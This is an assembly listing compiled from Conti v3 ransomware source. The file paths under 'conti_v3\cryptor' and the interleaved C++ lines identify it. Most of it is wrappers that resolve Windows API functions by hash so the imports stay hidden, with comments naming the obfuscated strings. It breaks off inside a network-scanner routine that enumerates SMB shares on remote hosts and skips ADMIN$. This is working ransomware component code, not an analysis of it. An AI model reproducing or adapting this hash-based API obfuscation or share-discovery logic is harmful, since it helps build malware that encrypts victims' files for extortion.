_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z
_TEXT	SEGMENT
pFunction$ = 8
phNewTimer$ = 256
TimerQueue$ = 264
Callback$ = 272
DueTime$ = 280
Period$ = 288
Flags$ = 296
Parameter$ = 304
?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z PROC ; pCreateTimerQueueTimer, COMDAT

; 385  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0001d	48 8d 6c 24 40	 lea	 rbp, QWORD PTR [rsp+64]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 386  : 	BOOL(WINAPI * pFunction)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
; 387  : 	pFunction = (BOOL(WINAPI*)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe59cbfdb, 77);//GetProcAddress(hKernel32, OBFA("CreateTimerQueueTimer"));

  0002e	41 b9 4d 00 00
	00		 mov	 r9d, 77			; 0000004dH
  00034	41 b8 db bf 9c
	e5		 mov	 r8d, -442712101		; e59cbfdbH
  0003a	ba 0f 00 00 00	 mov	 edx, 15
  0003f	33 c9		 xor	 ecx, ecx
  00041	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00046	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 388  : 	return pFunction(phNewTimer, TimerQueue, Callback, DueTime, Period, Flags, Parameter);

  0004a	8b 85 30 01 00
	00		 mov	 eax, DWORD PTR Parameter$[rbp]
  00050	89 44 24 30	 mov	 DWORD PTR [rsp+48], eax
  00054	8b 85 28 01 00
	00		 mov	 eax, DWORD PTR Flags$[rbp]
  0005a	89 44 24 28	 mov	 DWORD PTR [rsp+40], eax
  0005e	8b 85 20 01 00
	00		 mov	 eax, DWORD PTR Period$[rbp]
  00064	89 44 24 20	 mov	 DWORD PTR [rsp+32], eax
  00068	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR DueTime$[rbp]
  0006f	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR Callback$[rbp]
  00076	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR TimerQueue$[rbp]
  0007d	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR phNewTimer$[rbp]
  00084	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 389  : }

  00087	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0008e	5f		 pop	 rdi
  0008f	5d		 pop	 rbp
  00090	c3		 ret	 0
?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z ENDP ; pCreateTimerQueueTimer
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrcmpiW@@YAHPEB_W0@Z
_TEXT	SEGMENT
pFunction$ = 8
lpString1$ = 256
lpString2$ = 264
?plstrcmpiW@@YAHPEB_W0@Z PROC				; plstrcmpiW, COMDAT

; 341  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 342  : 	int(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00024	41 b9 51 00 00
	00		 mov	 r9d, 81			; 00000051H
  0002a	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  00030	ba 0f 00 00 00	 mov	 edx, 15
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 344  : 	return pFunction(lpString1, lpString2);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpString2$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpString1$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 345  : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?plstrcmpiW@@YAHPEB_W0@Z ENDP				; plstrcmpiW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z
_TEXT	SEGMENT
pFunction$ = 8
lpThreadAttributes$ = 256
dwStackSize$ = 264
lpStartAddress$ = 272
lpParameter$ = 280
dwCreationFlags$ = 288
lpThreadId$ = 296
?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z PROC ; pCreateThread, COMDAT

; 331  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0001d	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 332  : 	HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
; 333  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8687ce53, 82);//GetProcAddress(hKernel32, OBFA("CreateThread"));

  0002e	41 b9 52 00 00
	00		 mov	 r9d, 82			; 00000052H
  00034	41 b8 53 ce 87
	86		 mov	 r8d, -2037920173	; 8687ce53H
  0003a	ba 0f 00 00 00	 mov	 edx, 15
  0003f	33 c9		 xor	 ecx, ecx
  00041	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00046	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 334  : 	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

  0004a	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR lpThreadId$[rbp]
  00051	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  00056	8b 85 20 01 00
	00		 mov	 eax, DWORD PTR dwCreationFlags$[rbp]
  0005c	89 44 24 20	 mov	 DWORD PTR [rsp+32], eax
  00060	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR lpParameter$[rbp]
  00067	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR lpStartAddress$[rbp]
  0006e	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR dwStackSize$[rbp]
  00075	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpThreadAttributes$[rbp]
  0007c	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 335  : }

  0007f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00086	5f		 pop	 rdi
  00087	5d		 pop	 rbp
  00088	c3		 ret	 0
?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z ENDP ; pCreateThread
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z
_TEXT	SEGMENT
pFunction$ = 8
lpString1$ = 256
lpString2$ = 264
?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z PROC			; plstrcpyW, COMDAT

; 275  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 276  : 	LPWSTR(WINAPI * pFunction)(LPWSTR, LPCWSTR);
; 277  : 	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3fd9cc6a, 87);//GetProcAddress(hKernel32, OBFA("lstrcpyW"));

  00024	41 b9 57 00 00
	00		 mov	 r9d, 87			; 00000057H
  0002a	41 b8 6a cc d9
	3f		 mov	 r8d, 1071238250		; 3fd9cc6aH
  00030	ba 0f 00 00 00	 mov	 edx, 15
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 278  : 	return pFunction(lpString1, lpString2);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpString2$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpString1$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 279  : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z ENDP			; plstrcpyW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCloseHandle@@YAHPEAX@Z
_TEXT	SEGMENT
pFunction$ = 8
hObject$ = 256
?pCloseHandle@@YAHPEAX@Z PROC				; pCloseHandle, COMDAT

; 226  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 227  : 	BOOL(WINAPI * pFunction)(HANDLE);
; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  0001f	41 b9 5b 00 00
	00		 mov	 r9d, 91			; 0000005bH
  00025	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 229  : 	return pFunction(hObject);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hObject$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 230  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pCloseHandle@@YAHPEAX@Z ENDP				; pCloseHandle
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrcatW@@YAPEA_WPEA_WPEB_W@Z
_TEXT	SEGMENT
pFunction$ = 8
lpString1$ = 256
lpString2$ = 264
?plstrcatW@@YAPEA_WPEA_WPEB_W@Z PROC			; plstrcatW, COMDAT

; 217  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 218  : 	LPWSTR(WINAPI * pFunction)(LPWSTR, LPCWSTR);
; 219  : 	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd1da9915, 92);//GetProcAddress(hKernel32, OBFA("lstrcatW"));

  00024	41 b9 5c 00 00
	00		 mov	 r9d, 92			; 0000005cH
  0002a	41 b8 15 99 da
	d1		 mov	 r8d, -774203115		; d1da9915H
  00030	ba 0f 00 00 00	 mov	 edx, 15
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 220  : 	return pFunction(lpString1, lpString2);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpString2$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpString1$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 221  : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?plstrcatW@@YAPEA_WPEA_WPEB_W@Z ENDP			; plstrcatW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetLastError@@YAKXZ
_TEXT	SEGMENT
pFunction$ = 8
?pGetLastError@@YAKXZ PROC				; pGetLastError, COMDAT

; 207  : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 208  : 	DWORD(WINAPI * pFunction)();
; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  0001b	41 b9 5d 00 00
	00		 mov	 r9d, 93			; 0000005dH
  00021	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  00027	ba 0f 00 00 00	 mov	 edx, 15
  0002c	33 c9		 xor	 ecx, ecx
  0002e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00033	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 210  : 	return pFunction();

  00037	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 211  : }

  0003a	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?pGetLastError@@YAKXZ ENDP				; pGetLastError
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWaitForSingleObject@@YAKPEAXK@Z
_TEXT	SEGMENT
pFunction$ = 8
hHandle$ = 256
dwMilliseconds$ = 264
?pWaitForSingleObject@@YAKPEAXK@Z PROC			; pWaitForSingleObject, COMDAT

; 157  : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 158  : 	DWORD(WINAPI * pFunction)(HANDLE, DWORD);
; 159  : 	pFunction = (DWORD(WINAPI*)(HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe0c23134, 98);//GetProcAddress(hKernel32, OBFA("WaitForSingleObject"));

  00023	41 b9 62 00 00
	00		 mov	 r9d, 98			; 00000062H
  00029	41 b8 34 31 c2
	e0		 mov	 r8d, -524144332		; e0c23134H
  0002f	ba 0f 00 00 00	 mov	 edx, 15
  00034	33 c9		 xor	 ecx, ecx
  00036	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003b	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 160  : 	return pFunction(hHandle, dwMilliseconds);

  0003f	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR dwMilliseconds$[rbp]
  00045	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hHandle$[rbp]
  0004c	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 161  : }

  0004f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00056	5f		 pop	 rdi
  00057	5d		 pop	 rbp
  00058	c3		 ret	 0
?pWaitForSingleObject@@YAKPEAXK@Z ENDP			; pWaitForSingleObject
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCancelIo@@YAHPEAX@Z
_TEXT	SEGMENT
pFunction$ = 8
hFile$ = 256
?pCancelIo@@YAHPEAX@Z PROC				; pCancelIo, COMDAT

; 49   : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 50   : 	BOOL(WINAPI * pFunction)(HANDLE);
; 51   : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1cae2a52, 109);//GetProcAddress(hKernel32, OBFA("CancelIo"));

  0001f	41 b9 6d 00 00
	00		 mov	 r9d, 109		; 0000006dH
  00025	41 b8 52 2a ae
	1c		 mov	 r8d, 481176146		; 1cae2a52H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 52   : 	return pFunction(hFile);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hFile$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 53   : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pCancelIo@@YAHPEAX@Z ENDP				; pCancelIo
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
_TEXT	SEGMENT
Result$ = 4
ShareInfoBuffer$ = 40
er$ = 68
tr$ = 100
resume$ = 132
TempShareInfo$7 = 168
i$8 = 196
ShareInfo$9 = 232
$T10 = 456
$T11 = 500
$T12 = 532
$T13 = 568
tv94 = 616
__$ArrayPad$ = 624
pwszIpAddress$ = 672
ShareList$ = 680
?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z PROC ; network_scanner::EnumShares, COMDAT

; 228  : {

$LN16:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec c8 02
	00 00		 sub	 rsp, 712		; 000002c8H
  00013	48 8d 6c 24 40	 lea	 rbp, QWORD PTR [rsp+64]
  00018	48 8d 7c 24 40	 lea	 rdi, QWORD PTR [rsp+64]
  0001d	b9 72 00 00 00	 mov	 ecx, 114		; 00000072H
  00022	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00027	f3 ab		 rep stosd
  00029	48 8b 8c 24 e8
	02 00 00	 mov	 rcx, QWORD PTR [rsp+744]
  00031	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00038	48 33 c5	 xor	 rax, rbp
  0003b	48 89 85 70 02
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00042	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  00049	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 229  : 	NET_API_STATUS Result;
; 230  : 	LPSHARE_INFO_1 ShareInfoBuffer = NULL;

  0004e	48 c7 45 28 00
	00 00 00	 mov	 QWORD PTR ShareInfoBuffer$[rbp], 0

; 231  : 	DWORD er = 0, tr = 0, resume = 0;;

  00056	c7 45 44 00 00
	00 00		 mov	 DWORD PTR er$[rbp], 0
  0005d	c7 45 64 00 00
	00 00		 mov	 DWORD PTR tr$[rbp], 0
  00064	c7 85 84 00 00
	00 00 00 00 00	 mov	 DWORD PTR resume$[rbp], 0
$LN4@EnumShares:

; 232  : 
; 233  : 	do
; 234  : 	{
; 235  : 		Result = (NET_API_STATUS)pNetShareEnum(pwszIpAddress, 1, (LPBYTE*)&ShareInfoBuffer, MAX_PREFERRED_LENGTH, &er, &tr, &resume);

  0006e	48 8d 85 84 00
	00 00		 lea	 rax, QWORD PTR resume$[rbp]
  00075	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  0007a	48 8d 45 64	 lea	 rax, QWORD PTR tr$[rbp]
  0007e	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  00083	48 8d 45 44	 lea	 rax, QWORD PTR er$[rbp]
  00087	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  0008c	41 b9 ff ff ff
	ff		 mov	 r9d, -1			; ffffffffH
  00092	4c 8d 45 28	 lea	 r8, QWORD PTR ShareInfoBuffer$[rbp]
  00096	ba 01 00 00 00	 mov	 edx, 1
  0009b	48 8b 8d a0 02
	00 00		 mov	 rcx, QWORD PTR pwszIpAddress$[rbp]
  000a2	e8 00 00 00 00	 call	 ?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z ; pNetShareEnum
  000a7	89 45 04	 mov	 DWORD PTR Result$[rbp], eax

; 236  : 		if (Result == ERROR_SUCCESS)

  000aa	83 7d 04 00	 cmp	 DWORD PTR Result$[rbp], 0
  000ae	0f 85 f5 01 00
	00		 jne	 $LN11@EnumShares

; 237  : 		{
; 238  : 
; 239  : 			LPSHARE_INFO_1 TempShareInfo = ShareInfoBuffer;

  000b4	48 8b 45 28	 mov	 rax, QWORD PTR ShareInfoBuffer$[rbp]
  000b8	48 89 85 a8 00
	00 00		 mov	 QWORD PTR TempShareInfo$7[rbp], rax

; 240  : 
; 241  : 			for (DWORD i = 1; i <= er; i++)

  000bf	c7 85 c4 00 00
	00 01 00 00 00	 mov	 DWORD PTR i$8[rbp], 1
  000c9	eb 0e		 jmp	 SHORT $LN7@EnumShares
$LN5@EnumShares:
  000cb	8b 85 c4 00 00
	00		 mov	 eax, DWORD PTR i$8[rbp]
  000d1	ff c0		 inc	 eax
  000d3	89 85 c4 00 00
	00		 mov	 DWORD PTR i$8[rbp], eax
$LN7@EnumShares:
  000d9	8b 45 44	 mov	 eax, DWORD PTR er$[rbp]
  000dc	39 85 c4 00 00
	00		 cmp	 DWORD PTR i$8[rbp], eax
  000e2	0f 87 b8 01 00
	00		 ja	 $LN6@EnumShares

; 242  : 			{
; 243  : 
; 244  : 				if (TempShareInfo->shi1_type == STYPE_DISKTREE	||
; 245  : 					TempShareInfo->shi1_type == STYPE_SPECIAL	||

  000e8	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR TempShareInfo$7[rbp]
  000ef	83 78 08 00	 cmp	 DWORD PTR [rax+8], 0
  000f3	74 24		 je	 SHORT $LN13@EnumShares
  000f5	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR TempShareInfo$7[rbp]
  000fc	81 78 08 00 00
	00 80		 cmp	 DWORD PTR [rax+8], -2147483648 ; 80000000H
  00103	74 14		 je	 SHORT $LN13@EnumShares
  00105	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR TempShareInfo$7[rbp]
  0010c	81 78 08 00 00
	00 40		 cmp	 DWORD PTR [rax+8], 1073741824 ; 40000000H
  00113	0f 85 70 01 00
	00		 jne	 $LN12@EnumShares
$LN13@EnumShares:

; 246  : 					TempShareInfo->shi1_type == STYPE_TEMPORARY) 
; 247  : 				{
; 248  : 
; 249  : 					PSHARE_INFO ShareInfo = (PSHARE_INFO)m_malloc(sizeof(SHARE_INFO));

  00119	b9 10 7d 00 00	 mov	 ecx, 32016		; 00007d10H
  0011e	e8 00 00 00 00	 call	 ?m_malloc@@YAPEAX_K@Z	; m_malloc
  00123	48 89 85 e8 00
	00 00		 mov	 QWORD PTR ShareInfo$9[rbp], rax

; 250  : 					
; 251  : 					if (ShareInfo && plstrcmpiW(TempShareInfo->shi1_netname, OBFW(L"ADMIN$"))) {

  0012a	48 83 bd e8 00
	00 00 00	 cmp	 QWORD PTR ShareInfo$9[rbp], 0
  00132	0f 84 51 01 00
	00		 je	 $LN14@EnumShares
  00138	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1O@IGADBKJD@?$AAA?$AAD?$AAM?$AAI?$AAN?$AA$@
  0013f	48 8d 8d c8 01
	00 00		 lea	 rcx, QWORD PTR $T10[rbp]
  00146	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
